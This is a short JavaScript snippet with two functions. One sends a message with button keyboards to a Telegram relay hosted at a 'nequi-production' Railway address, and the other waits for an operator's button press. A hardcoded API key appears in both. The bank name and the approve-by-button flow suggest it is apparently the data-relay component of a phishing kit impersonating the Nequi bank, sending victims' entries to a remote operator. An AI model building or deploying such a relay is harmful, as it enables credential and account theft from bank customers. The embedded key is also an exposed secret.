async function sendTelegramMessageWithBtn(mensaje, teclado) {
  // const url = 'https://nequi-production.up.railway.app/send-message';

  const url = "https://nequi-production.up.railway.app/send-message";

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-api-key-authorization": "a8B3dE4F9gH2JkL5mN",
      "x-client-id": "user1",
    },
    body: JSON.stringify({
      mensaje: mensaje,
      teclado: teclado,
    }),
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`${response.status}: ${errorText}`);
  }

  const responseData = await response.json();

  return responseData;
}

async function waitForButtonPress(messageId, timeout = 120) {
  const url = "https://nequi-production.up.railway.app/wait-action";
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-api-key-authorization": "a8B3dE4F9gH2JkL5mN",
      "x-client-id": "user1",
    },
    body: JSON.stringify({
      message_id: messageId,
      totalTimeoutMs: timeout * 1000,
      pollTimeoutSec: 5,
      removeKeyboard: true,
    }),
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`${response.status}: ${errorText}`);
  }

  const respuesta = await response.json();
  return respuesta;
}
